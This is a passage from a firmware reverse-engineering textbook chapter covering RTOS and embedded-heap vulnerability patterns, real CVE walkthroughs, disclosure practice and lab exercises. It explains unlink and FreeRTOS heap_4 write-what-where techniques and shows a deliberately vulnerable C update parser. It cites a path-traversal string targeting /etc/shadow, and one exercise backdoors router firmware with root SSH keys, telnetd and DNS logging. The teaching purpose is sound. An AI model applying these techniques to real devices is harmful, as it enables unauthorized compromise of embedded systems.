The practical limitations of symbolic execution on firmware are significant: path explosion (the number of symbolic states grows exponentially with the number of conditional branches), environmental modeling (the firmware interacts with hardware registers that angr does not model — each unmodeled MMIO read introduces an unconstrained symbolic value that doubles the state space), and scale (firmware images of 10+ MB with hundreds of functions are beyond the practical reach of whole-program symbolic execution). The effective strategy is to apply symbolic execution surgically to small, well-bounded functions (authentication checks, key derivation functions, input validators) rather than attempting to symbolically execute the entire firmware.

### 10.3 Vulnerability patterns in RTOS firmware

Real-Time Operating Systems (FreeRTOS, Zephyr, ThreadX/Azure RTOS, VxWorks, Micrium/uC-OS, RIOT) present distinct vulnerability patterns compared to Linux-based firmware because they lack many of the isolation and mitigation mechanisms that Linux provides. There is no virtual memory (all tasks share a single flat address space), no ASLR, no stack canaries by default (though some RTOS ports support them), and often no process isolation — a vulnerability in any task compromises the entire system.

FreeRTOS, the most widely deployed RTOS (AWS estimates tens of billions of downloads), has a history of vulnerabilities in its TCP/IP stack (FreeRTOS+TCP). CVE-2018-16522 through CVE-2018-16528 (discovered by Zimperium) were a set of vulnerabilities in FreeRTOS's TCP/IP implementation that included: a buffer overflow in the DHCP response parser (the parser did not validate the length of DHCP options before copying them into a fixed-size buffer), an information disclosure in the TCP urgent data processing, and a heap overflow in the ARP response handler. These vulnerabilities affected any device running FreeRTOS with networking enabled — industrial controllers, medical devices, smart home hubs.

The common vulnerability patterns in RTOS firmware are: (1) Stack buffer overflows in protocol parsers — RTOS tasks have fixed-size stacks (typically 256 bytes to 8 KB, configured at task creation), and protocol parsing functions that use stack-allocated buffers for incoming data are vulnerable when the input exceeds the buffer size. (2) Heap corruption in the RTOS allocator — FreeRTOS uses a set of heap implementations (heap_1 through heap_5) that vary in complexity but all lack the hardening present in glibc's malloc (no canaries, no safe unlinking, no randomized chunk placement). Exploiting heap overflows on FreeRTOS heap_4 (the most commonly used implementation, which is a first-fit allocator with block coalescing) follows classic heap exploitation techniques adapted for the simpler allocator metadata. (3) Integer overflows in size calculations — length fields parsed from network packets or configuration data are used in `pvPortMalloc()` calls without overflow checks, leading to undersized allocations followed by buffer overflows during data copy. (4) Missing authentication on management interfaces — many RTOS-based devices expose debug or configuration interfaces (Telnet, HTTP, custom TCP protocols) with no authentication, relying on network segmentation for protection.

### 10.4 Heap exploitation on embedded allocators

Heap exploitation on embedded systems differs fundamentally from glibc heap exploitation because embedded allocators (newlib's `malloc`, FreeRTOS heap implementations, dlmalloc variants, and custom allocators) use simpler metadata structures and lack the integrity checks that modern glibc has accumulated over decades of exploitation research.

The newlib `malloc` implementation (used by many bare-metal and RTOS environments built with the ARM GCC toolchain) is a dlmalloc derivative. Each allocated chunk has an 8-byte header on 32-bit systems: a `size` field (including flags in the low bits indicating whether the previous chunk is in use) and a `prev_size` field (the size of the previous chunk, valid only when the previous chunk is free). Free chunks additionally contain forward and backward pointers to the free list. An overflow from one chunk into the header of the next chunk allows the attacker to corrupt the `size` field (controlling how much data the next `free()` or `realloc()` will process) or, for free chunks, corrupt the forward/backward pointers (leading to an arbitrary write when the chunk is unlinked from the free list during `malloc()`).

The exploitation primitive on newlib is the classic unlink attack: overwrite a free chunk's forward pointer (`fd`) with the target write address minus an offset, and the backward pointer (`bk`) with the value to write. When `malloc()` unlinks this chunk, it performs `fd->bk = bk` and `bk->fd = fd`, achieving a write-what-where. Modern glibc mitigates this with safe unlinking checks (`if (P->fd->bk != P || P->bk->fd != P) abort()`), but newlib and most embedded allocators do not implement these checks.

FreeRTOS `heap_4` uses an even simpler structure. Each block has a `BlockLink_t` header containing `pxNextFreeBlock` (pointer to the next free block in the sorted free list) and `xBlockSize` (the block size including the header, with the MSB used as an "allocated" flag). Overflow into the header of a free block allows corrupting `pxNextFreeBlock`. When FreeRTOS's `pvPortMalloc()` traverses the free list and encounters the corrupted pointer, it returns the attacker-controlled address as the "allocated" memory. The next write to this returned pointer achieves an arbitrary write.

### 10.5 Integer overflow patterns in firmware update parsers

Firmware update parsers are a high-value target because they process untrusted input (the update file) with elevated privileges (the update agent typically runs as root or in a privileged context). Integer overflow vulnerabilities in these parsers follow a consistent pattern: the parser reads a length field from the update file header, uses it in an arithmetic operation (typically adding a header size or aligning to a block boundary) that overflows the integer width, and then allocates a buffer based on the overflowed (small) result. The subsequent data copy uses the original (large) length, overflowing the undersized buffer.

The vulnerable pattern in C:

```c
/* Vulnerable firmware update header parser */
typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t version;
    uint32_t data_length;    /* Attacker-controlled */
    uint32_t header_crc;
} fw_update_header_t;

int parse_update(const uint8_t *input, size_t input_len) {
    fw_update_header_t *hdr = (fw_update_header_t *)input;

    /* Integer overflow: data_length + sizeof(header) can wrap around
       on 32-bit systems if data_length is close to UINT32_MAX */
    uint32_t total_size = hdr->data_length + sizeof(fw_update_header_t);
    /* If data_length = 0xFFFFFFF0, total_size = 0x00000000 (overflow) */

    uint8_t *buffer = malloc(total_size);  /* Allocates 0 or very small */
    if (!buffer) return -1;

    /* Copies data_length (0xFFFFFFF0) bytes into the undersized buffer */
    memcpy(buffer, input + sizeof(fw_update_header_t), hdr->data_length);
    /* HEAP BUFFER OVERFLOW */

    return process_firmware(buffer, hdr->data_length);
}
```

The fix requires checking for overflow before the arithmetic: if `data_length > UINT32_MAX - sizeof(fw_update_header_t)`, reject the input. Alternatively, using `size_t` instead of `uint32_t` on 64-bit systems avoids the overflow for practical input sizes, but this is not a portable fix for 32-bit embedded targets.

### 10.6 Real CVE walkthroughs

**CVE-2023-24626** (GNU Screen 4.9.0, CVSS 6.5): This is a buffer overflow in the terminal multiplexer GNU Screen, triggered when processing a crafted combining character sequence. While GNU Screen is not firmware in the narrow sense, the vulnerability pattern — insufficient bounds checking on character-sequence processing in a widely-deployed C utility — is directly analogous to vulnerabilities found in embedded terminal handlers, serial console parsers, and UART command interpreters in firmware. The vulnerable code path processes combining characters (Unicode characters that modify the preceding character, such as accents and diacritical marks) without adequately checking whether the write position exceeds the screen buffer boundaries. In embedded contexts, the same pattern manifests when firmware processes variable-length encoded input (UTF-8, ASN.1, TLV) with fixed-size internal buffers. The root cause — trusting that the input conforms to expected length constraints without validation — recurs throughout embedded software.

**CVE-2022-27635** (Intel Wi-Fi firmware, CVSS 6.7): An improper access control vulnerability in the Intel Wi-Fi firmware used in multiple Intel wireless adapters. The vulnerability allowed a privileged local attacker to escalate privileges through the Wi-Fi firmware, potentially achieving code execution on the Wi-Fi co-processor. The exploit path ran from the host driver interface to the firmware's command parser, where insufficient validation of command parameters allowed writing to restricted firmware memory regions. Intel patched this in firmware update 22.220 and later. The research methodology involved extracting the Wi-Fi firmware binary from the Linux `iwlwifi` driver package (the firmware is distributed as a `.ucode` file loaded by the driver at initialization), reversing the firmware's command dispatch table (the firmware processes commands sent from the host driver via a ring buffer in shared memory), and identifying commands where the parameter validation was insufficient. This CVE illustrates the broader pattern of Wi-Fi/Bluetooth firmware serving as a privilege boundary — the firmware runs on a separate processor with DMA access to the host system's memory, so firmware compromise can escalate to host compromise (Domain 5, Chapter 5B for DMA attack implications).

**CVE-2023-20078** (Cisco IP Phone 6800/7800/8800 Series, CVSS 9.8): A remote code execution vulnerability in the web-based management interface of Cisco IP Phones. The vulnerability existed in the firmware's HTTP request handler, which parsed user-supplied input and passed it to a system command without adequate sanitization — a command injection flaw. An unauthenticated remote attacker could send a crafted HTTP request to the phone's web interface and execute arbitrary commands as root on the phone's embedded Linux OS. The firmware analysis methodology was: extract the Cisco IP Phone firmware from the signed firmware package (Cisco distributes phone firmware as `.cop` files that can be unpacked), mount the root filesystem, locate the web server binary and its CGI handlers, and trace user input from HTTP parameters through to system command execution. The vulnerable code path passed HTTP POST parameters through string formatting into a `system()` call. The fix sanitized the input by escaping shell metacharacters before command execution.

**CVE-2022-29844** (Western Digital My Cloud NAS, CVSS 9.8): A path-traversal vulnerability in the firmware update mechanism of WD My Cloud NAS devices. The firmware update parser extracted files from the update archive to the filesystem without sanitizing file paths, allowing an attacker to write arbitrary files to arbitrary locations via a crafted update package containing path-traversal sequences (`../../../etc/shadow`). Because the update agent ran as root, the attacker could overwrite any file on the system, achieving remote code execution by replacing a system binary or adding a crontab entry. The RE methodology involved: extracting the WD My Cloud firmware (available from WD's download site as a `.bin` file), mounting the root filesystem, identifying the update agent binary, and reversing its archive extraction logic to find the path-traversal vulnerability. The fix added path canonicalization and a check that all extracted file paths remain within the designated update directory.

### 10.7 Responsible disclosure for embedded and IoT devices

Firmware vulnerability disclosure faces challenges not present in conventional software disclosure. Patch deployment timelines are measured in months or years (not days), because firmware updates require extensive hardware testing, carrier certification (for cellular devices), regulatory recertification (for medical and automotive devices), and physical intervention for devices without OTA update capability. The vendor may no longer support the affected product (end-of-life is common for consumer IoT devices within 2–3 years of release). The vendor may not have a PSIRT (Product Security Incident Response Team) or a coordinated disclosure process.

The responsible disclosure workflow for embedded vulnerabilities begins with identifying the correct vendor contact. Many IoT device manufacturers are ODMs (Original Design Manufacturers) that produce hardware for multiple brands — the brand on the device label may not be the entity that developed the firmware. Identifying the actual firmware developer (by examining copyright strings, build system artifacts, and SDK references in the firmware) and contacting them directly is often more productive than contacting the brand owner.

The disclosure report must include: the exact firmware version affected (identified by the version string, build date, and hash of the firmware image), the device model and hardware revision, a reproducible proof-of-concept (ideally a script that exploits the vulnerability on the emulated firmware, avoiding the need for the vendor to set up physical hardware), the root cause analysis (which function, which input, which missing check), and a recommended fix (specific code change or configuration, not just "improve input validation"). CVSS scoring and CWE classification provide standardized severity context. The timeline proposal should account for firmware-specific deployment constraints: 90 days may be sufficient for a cloud-connected device with OTA updates, but a medical device requiring FDA 510(k) resubmission may need 180+ days.

For devices that will never receive a patch (end-of-life products, abandoned vendors, devices without update capability), the disclosure decision is harder. Publishing the vulnerability details enables defenders to implement network-level mitigations (IDS rules, firewall rules, network segmentation) and enables device owners to make informed decommissioning decisions. Withholding the details protects devices that will never be patched but also prevents the defender community from understanding and mitigating the risk. The generally accepted practice is to disclose after a reasonable coordination period (120 days for IoT devices, per the CERT/CC guideline), with network-level detection rules included in the advisory to enable immediate mitigation.

---

## 11. Cross-references

**To Domain 1:** UEFI DXE drivers are PE32+ images (Domain 1, Chapter 2). ELF analysis (Chapters 1A–1B) applies to embedded Linux firmware. Bootloader binaries (U-Boot) are ELF or raw binary formats analyzed with the same tools.

**To Domain 5:** TrustZone/SMC handler vulnerabilities (§1.1) are kernel-level exploitation (Domain 5) in the Secure World context. Baseband vulnerabilities (§4) are exploited via the same memory-corruption primitives (heap overflow, type confusion) described in Domains 3 and 5.

**To Domain 9:** Automotive Ethernet (§5.3) brings IP-based network security (Domain 9) into vehicles. CAN bus injection (§5.1) is a Layer 2 attack (Domain 9, Chapter 9B §1) at the automotive protocol level. Baseband protocols (§4) process the radio-layer data that carries the cellular protocols secured by the 5G architecture (Domain 9, Chapter 9B §3.3).

**To Domain 7:** Side-channel attacks on secure elements (§6.4) use the same power/EM analysis techniques as PLATYPUS and hardware DPA (Domain 7, Chapter 7B §3.1). FPGA bitstream encryption cracking uses side-channel analysis of the FPGA's AES decryption engine.

**To Chapter 12A:** Static and dynamic analysis techniques (Chapter 12A) are applied to firmware binaries. Ghidra's multi-architecture support (ARM, MIPS, PPC, Xtensa) makes it the primary decompiler for embedded firmware. Symbolic execution (angr) supports ARM and MIPS for automated firmware vulnerability discovery.

---

## 12. Exercises

### Exercise 12.1 — SPI Flash Extraction and Firmware Triage with binwalk

Using a development board (ESP32-DevKitC, Raspberry Pi Pico, or STM32 Nucleo with external SPI flash) or a consumer IoT device (a router, IP camera, or smart plug with an accessible SPI flash chip):

1. Identify the SPI flash chip by reading its part marking. Look up the datasheet and confirm the voltage levels, capacity, and JEDEC ID. Connect a Raspberry Pi (or CH341A) via SPI clip and read the flash twice with `flashrom`. Verify both reads produce identical SHA-256 hashes.
2. Run `binwalk -E` on the dump and interpret the entropy plot: identify the bootloader region (low entropy, structured), kernel (compressed, high entropy), root filesystem (high entropy with boundaries), and any unaccounted regions. Run `binwalk -e` for recursive extraction. Use `unsquashfs -s` to verify filesystem parameters (compression algorithm, block size).
3. Extract the root filesystem and run FirmWalker against it. Document all findings: hardcoded credentials, private keys, URLs, IP addresses, and SUID binaries. Cross-reference found credentials against default-password databases.

### Exercise 12.2 — JTAG/SWD Firmware Dump and Debug with OpenOCD

Using an ARM Cortex-M development board (STM32F4 Discovery, nRF52840-DK, or equivalent) with SWD accessible:

1. Write an OpenOCD configuration file specifying the interface (ST-Link, J-Link, or CMSIS-DAP), transport (SWD), target (the specific SoC), and adapter speed. Start OpenOCD, connect via telnet, and halt the CPU. Dump the entire flash region and the SRAM contents to separate files.
2. Set a hardware breakpoint at the main function entry point. Resume execution and observe the break. Single-step through the initialization sequence, reading registers at each step. Identify the function that initializes the UART peripheral by tracing writes to the UART base address (from the SoC datasheet).
3. If the board has Read-Out Protection (RDP) at Level 0, enable RDP Level 1 via the option bytes. Attempt to read flash via OpenOCD and document the failure. Research and document the known bypass techniques for the specific SoC family (voltage glitching, debug interface race conditions). Reset RDP to Level 0 to restore access.

### Exercise 12.3 — Firmware Modification, Repacking, and Emulation

Using a Linux-based router firmware image (OpenWrt or a vendor firmware from a supported device):

1. Extract the firmware with `binwalk -e`. Identify the squashfs root filesystem. Extract it with `unsquashfs`. Modify the filesystem: add an SSH authorized_keys file for root, enable telnetd in the init scripts, and add a custom script that logs all DNS queries to a file.
2. Repack the squashfs with `mksquashfs` using exactly the same compression and block-size parameters as the original (verified via `unsquashfs -s`). Reassemble the firmware image by concatenating the original header/kernel with the new squashfs. If the firmware has a header checksum, compute and update it.
3. Boot the modified firmware in QEMU system-mode emulation (using the appropriate machine type for the target architecture — `malta` for MIPS, `versatilepb` for ARM). Verify the modifications are active: SSH in with the authorized key, confirm telnetd is running, and verify DNS logging is operational. Document any peripheral-emulation failures and the workarounds applied.

### Exercise 12.4 — CAN Bus Sniffing, Signal Reverse Engineering, and UDS SecurityAccess

Using a virtual CAN interface (`vcan0`) or a physical CAN adapter (PEAK PCAN-USB, CANtact) connected to an automotive ECU simulator or test bench:

1. Set up the CAN interface with `ip link`. Use `candump` to capture 60 seconds of traffic. Use `cansniffer` to identify arbitration IDs with changing data bytes. Correlate observed changes with known actions (if using a simulator: RPM changes, steering input, brake application).
2. Use `isotpsend` and `isotprecv` to send a UDS DiagnosticSessionControl request (`0x10 0x03`) to enter Extended Diagnostic Session. Send a SecurityAccess requestSeed (`0x27 0x01`) and capture the seed response. Implement the seed-to-key algorithm (XOR with a static mask, for a lab ECU) in Python and send the computed key. Verify the ECU grants access.
3. With Security Access granted, use UDS ReadDataByIdentifier (`0x22`) to read the ECU's software version, hardware version, and VIN. Attempt RequestUpload (`0x35`) to extract a portion of the ECU's firmware. Document which services are available and which return negative response codes.

### Exercise 12.5 — Firmware Forensic Acquisition and Backdoor Detection

Given two firmware images — a known-good vendor release and a suspect dump from a device exhibiting anomalous network behavior:

1. Perform a forensic acquisition of the suspect firmware (if from a live device: live acquisition via `dd` of MTD devices with SHA-256 hashing, followed by cold extraction via SPI clip with dual-read verification). Document the chain of custody: photographs, component markings, timestamps.
2. Extract both filesystems. Run `diff -rq` to identify differing and additional files. For each differing ELF binary, run `radiff2` to compare at the binary level. For each new file, run `file`, `strings`, and load into Ghidra for triage. Identify any backdoor indicators: reverse shells, hardcoded C2 domains, or unauthorized network listeners.
3. Perform entropy analysis on the full suspect dump to identify hidden partitions or encrypted payloads in unaccounted flash regions. If a hidden payload is found, attempt to identify the encryption scheme (XOR, AES) by searching the firmware for crypto constants and decryption routines. Write YARA rules that detect the identified backdoor patterns.

---

## 13. Readings and References

*(retrieved: 2026-05-29)*

### Standards and Specifications

- ARM Trusted Firmware-A (TF-A) Documentation. <https://trustedfirmware-a.readthedocs.io/>
- ARM SMC Calling Convention (SMCCC). <https://developer.arm.com/documentation/den0028/>
- ARM CoreSight Architecture Specification. <https://developer.arm.com/documentation/ihi0029/>
- UEFI Specification 2.10. <https://uefi.org/specifications>
- ISO 14229 — Unified Diagnostic Services (UDS) on CAN.
- ISO 11898 — Controller Area Network (CAN) specification.
- UNECE WP.29 — Cybersecurity and Software Updates for Vehicles (UN Regulation No. 155/156).
- AUTOSAR SecOC — Secure Onboard Communication Specification. <https://www.autosar.org/>

### Tools and Frameworks

- binwalk — Firmware Analysis and Extraction Tool. <https://github.com/ReFirmLabs/binwalk>
- flashrom — Open-Source Flash Programmer. <https://www.flashrom.org/>
- OpenOCD — Open On-Chip Debugger. <https://openocd.org/>
- Firmadyne — Automated IoT Firmware Emulation. <https://github.com/firmadyne/firmadyne>
- FirmWalker — Firmware Filesystem Analyzer. <https://github.com/craigz28/firmwalker>
- chipsec — Platform Security Assessment Framework. <https://github.com/chipsec/chipsec>
- UEFITool — UEFI Firmware Image Parser. <https://github.com/LongSoft/UEFITool>
- efiXplorer — IDA Plugin for UEFI Analysis. <https://github.com/binarly-io/efiXplorer>
- can-utils — Linux SocketCAN Utilities. <https://github.com/linux-can/can-utils>
- SavvyCAN — CAN Bus Reverse Engineering Tool. <https://github.com/collin80/SavvyCAN>
- qcsuper — Qualcomm DIAG Protocol Tool. <https://github.com/P1sec/QCSuper>
- KillerBee — Zigbee Security Research Framework. <https://github.com/riverloopsec/killerbee>
- JTAGulator — JTAG/UART Pinout Discovery Tool. <http://www.grandideastudio.com/jtagulator/>

### Research Papers and Advisories

- Beniamini, G. "Extracting Qualcomm's KeyMaster Keys — Breaking Android Full Disk Encryption." Project Zero Blog, 2016.
- Komaromy, D. and Grassi, N. "Unbox Your Phone: Breaking Samsung's TrustZone." Quarkslab, 2020.
- Hernandez, G. et al. "FirmUSB: Vetting USB Device Firmware Using Domain-Informed Symbolic Execution." ACM CCS 2017.
- Miller, C. and Valasek, C. "Remote Exploitation of an Unaltered Passenger Vehicle." Black Hat USA, 2015.
- Google Project Zero. "Multiple Internet-to-Baseband Remote Code Execution Vulnerabilities in Exynos Modems." March 2023. (CVE-2023-24033 and related.)

### CVEs Referenced

- CVE-2022-47630 — ARM TF-A authenticated decryption out-of-bounds read. CVSS 7.1.
- CVE-2020-10713 — BootHole: GRUB2 buffer overflow bypassing UEFI Secure Boot. CVSS 8.2.
- CVE-2022-21894 — Baton Drop: Windows Boot Manager Secure Boot bypass. CVSS 6.7.
- CVE-2023-24033 — Samsung Shannon baseband RCE via SDP parsing. CVSS 9.8.
- CVE-2023-20198 — Cisco IOS XE web UI unauthenticated RCE. CVSS 10.0.
- CVE-2019-19781 — Citrix ADC directory traversal to RCE. CVSS 9.8.

---

## 14. Cross-Reference Matrix

| Section | Related Domain | Chapter & Section | Relationship |
|---------|---------------|-------------------|-------------|
| §1 ARM TF-A / Secure Boot | Domain 5 | Chapter 5B §7 (TrustZone exploitation) | SMC handler vulnerabilities enable Normal-to-Secure World escalation |
| §2 SPI/JTAG/UART Extraction | Domain 7 | Chapter 7B §3.1 (Side-channel / physical attacks) | Hardware extraction interfaces use the same physical-access threat model as DPA/FI |
| §3 Firmware Analysis (binwalk) | Chapter 12A | §15 RE Methodology | Firmware triage follows the same Phase 1–4 methodology adapted for embedded targets |
| §4 Baseband RE | Domain 9 | Chapter 9B §3.3 (5G security) | Baseband protocols process the radio-layer data secured by the 5G NAS/RRC architecture |
| §5 Automotive RE (CAN/UDS) | Domain 9 | Chapter 9B §1 (Layer 2 attacks) | CAN bus injection is a Layer 2 broadcast attack; automotive Ethernet brings IP-level security |
| §6 FPGA/PCB/SDR RE | Domain 7 | Chapter 7B §3 (Hardware side-channels) | FPGA bitstream encryption cracking uses DPA on the AES decryption engine; SDR captures radio-layer signals |

---

## 15. Glossary

| Term | Definition |
|------|-----------|
| **SPI NOR** | Serial Peripheral Interface NOR flash — the most common firmware storage in embedded devices; accessed via a 4-wire bus (CLK, MOSI, MISO, CS). |
| **JTAG** | Joint Test Action Group (IEEE 1149.1) — a standardized 4/5-wire debug and boundary-scan interface providing CPU halt, single-step, and memory access. |
| **SWD (Serial Wire Debug)** | ARM's 2-wire debug interface (SWDIO, SWCLK), functionally equivalent to JTAG for ARM Cortex cores, using the CoreSight DAP. |
| **UART** | Universal Asynchronous Receiver/Transmitter — a serial communication interface commonly used for boot consoles and debug output on embedded devices. |
| **OEP (Original Entry Point)** | In packed firmware, the address where the real code begins executing after the unpacking stub has decompressed the payload into memory. |
| **MTD (Memory Technology Device)** | The Linux kernel subsystem for managing flash storage; exposes flash partitions as `/dev/mtdN` block devices. |
| **squashfs** | A compressed, read-only Linux filesystem widely used as the root filesystem in embedded devices; extracted with `unsquashfs`. |
| **UBIFS** | Unsorted Block Image File System — a flash filesystem designed for raw NAND, managed by the UBI (Unsorted Block Images) layer. |
| **binwalk** | A firmware analysis tool that scans binary images for embedded file signatures, performs entropy analysis, and recursively extracts identified components. |
| **TF-A (Trusted Firmware-A)** | ARM's reference implementation of the Secure World software running at EL3, providing the secure monitor and SMC dispatch. |
| **SMC (Secure Monitor Call)** | The ARM instruction that traps from the Normal World to EL3 (Secure Monitor); the primary interface between Normal and Secure Worlds. |
| **UDS (Unified Diagnostic Services)** | ISO 14229 — the standard diagnostic protocol for automotive ECUs, running over CAN (ISO-TP transport layer). |
| **CAN (Controller Area Network)** | The primary communication bus in vehicles; broadcast protocol with no authentication, encryption, or source addressing in the base specification. |
| **eMMC** | Embedded MultiMediaCard — a managed NAND flash with integrated controller, accessed via an MMC command interface; common in smartphones and embedded devices. |
| **OTP (One-Time Programmable)** | Fuse-based storage that can be written exactly once; used for storing cryptographic keys, debug-disable flags, and anti-rollback counters. |
